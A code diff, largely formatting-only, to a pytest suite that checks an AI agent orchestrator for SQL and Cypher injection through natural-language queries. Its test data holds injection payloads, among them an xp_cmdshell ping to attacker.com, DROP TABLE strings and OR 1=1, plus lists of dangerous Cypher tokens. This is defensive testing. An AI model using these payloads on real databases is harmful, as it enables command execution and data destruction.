@@ -21,7 +21,6 @@ from __future__ import annotations
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
-
 from app.agents.orchestrator import run_orchestrator
 from app.api.schemas import IntentClassification, WsResponse
 from app.kg.queries import QUERIES
@@ -58,18 +57,18 @@ def test_kg_queries_are_all_parameterized() -> None:
     Neo4j-style parameter substitution. No string formatting allowed.
     """
     dangerous_patterns = [
-        "f\"",          # f-string SQL/Cypher construction
-        "% s",          # old-style % formatting
-        "format(",      # .format() call
-        "+ query",      # string concatenation
-        "+ user",       # concatenation with user input
-        "raw_input",    # raw user data
+        'f"',  # f-string SQL/Cypher construction
+        "% s",  # old-style % formatting
+        "format(",  # .format() call
+        "+ query",  # string concatenation
+        "+ user",  # concatenation with user input
+        "raw_input",  # raw user data
     ]
     for query_type, cypher in QUERIES.items():
         for pattern in dangerous_patterns:
-            assert pattern not in cypher, (
-                f"Potentially unsafe pattern {pattern!r} found in QUERIES[{query_type!r}]"
-            )
+            assert (
+                pattern not in cypher
+            ), f"Potentially unsafe pattern {pattern!r} found in QUERIES[{query_type!r}]"
         # Must contain at least one $ parameter
         assert "$" in cypher, (
             f"QUERIES[{query_type!r}] has no parameterized variables ($var). "
@@ -79,10 +78,14 @@ def test_kg_queries_are_all_parameterized() -> None:
 
 def test_kg_query_types_whitelist_is_finite_and_known() -> None:
     """The QUERIES whitelist must contain exactly the 3 tools defined in §4.3.4."""
-    expected = {"traverse_supply_network", "find_affected_products", "get_supplier_alternatives"}
-    assert set(QUERIES.keys()) == expected, (
-        f"QUERIES whitelist mismatch. Expected {expected}, got {set(QUERIES.keys())}"
-    )
+    expected = {
+        "traverse_supply_network",
+        "find_affected_products",
+        "get_supplier_alternatives",
+    }
+    assert (
+        set(QUERIES.keys()) == expected
+    ), f"QUERIES whitelist mismatch. Expected {expected}, got {set(QUERIES.keys())}"
 
 
 # ---------------------------------------------------------------------------
@@ -106,7 +109,7 @@ SQL_INJECTION_QUERIES = [
     # SQL-06: Out-of-band
     "Get suppliers; EXEC xp_cmdshell('ping attacker.com')",
     # SQL-07: Second-order injection
-    "Route bearings from supplier named \"'); DROP TABLE supply_chain.logistics_arcs; --\"",
+    'Route bearings from supplier named "\'); DROP TABLE supply_chain.logistics_arcs; --"',
     # SQL-08: Null byte
     "Show product \x00'; DROP TABLE products;--",
     # SQL-09: Subquery exfiltration
@@ -132,7 +135,7 @@ SQL_INJECTION_QUERIES = [
     # SQL-19: Cursor-based
     "Get suppliers DECLARE @v NVARCHAR(256); SET @v='DROP TABLE vendors'; EXEC(@v)",
     # SQL-20: JSON path injection
-    "Query ERP with filter {\"name\": \"' OR 1=1--\"}",
+    'Query ERP with filter {"name": "\' OR 1=1--"}',
 ]
 
 
@@ -180,9 +183,16 @@ async def test_sql_injection_via_nl_query(query: str, label: str) -> None:
         response = await run_orchestrator(query)
 
     # Must be a valid WsResponse — not a raw SQL exception
-    assert isinstance(response, WsResponse), f"[{label}] Did not return WsResponse: {response}"
+    assert isinstance(
+        response, WsResponse
+    ), f"[{label}] Did not return WsResponse: {response}"
     # No SQL error strings should appear in the response
-    sql_error_patterns = ["syntax error", "pg_", "relation does not exist", "column does not exist"]
+    sql_error_patterns = [
+        "syntax error",
+        "pg_",
+        "relation does not exist",
+        "column does not exist",
+    ]
     text = (response.content or "") + (response.error or "")
     for pattern in sql_error_patterns:
         assert pattern.lower() not in text.lower(), (
@@ -276,18 +286,23 @@ async def test_cypher_injection_via_nl_query(query: str, label: str) -> None:
     ):
         response = await run_orchestrator(query)
 
-    assert isinstance(response, WsResponse), (
-        f"[{label}] Did not return WsResponse: {response}"
-    )
+    assert isinstance(
+        response, WsResponse
+    ), f"[{label}] Did not return WsResponse: {response}"
     # If neo4j_execute_mock was called, verify it was NOT called with raw user input
     for call in neo4j_execute_mock.call_args_list:
         cypher_arg = call.args[0] if call.args else ""
-        assert CYPHER_INJECTION_SENTINEL not in cypher_arg, (
-            f"[{label}] Raw Cypher injection reached Neo4j client"
-        )
+        assert (
+            CYPHER_INJECTION_SENTINEL not in cypher_arg
+        ), f"[{label}] Raw Cypher injection reached Neo4j client"
         # Raw adversarial patterns must not appear verbatim in Cypher passed to DB
-        dangerous_tokens = ["DETACH DELETE", "DROP INDEX", "DROP CONSTRAINT", "apoc.cypher"]
+        dangerous_tokens = [
+            "DETACH DELETE",
+            "DROP INDEX",
+            "DROP CONSTRAINT",
+            "apoc.cypher",
+        ]
         for token in dangerous_tokens:
-            assert token not in cypher_arg, (
-                f"[{label}] Dangerous Cypher token {token!r} found in Neo4j call"
-            )
+            assert (
+                token not in cypher_arg
+            ), f"[{label}] Dangerous Cypher token {token!r} found in Neo4j call"
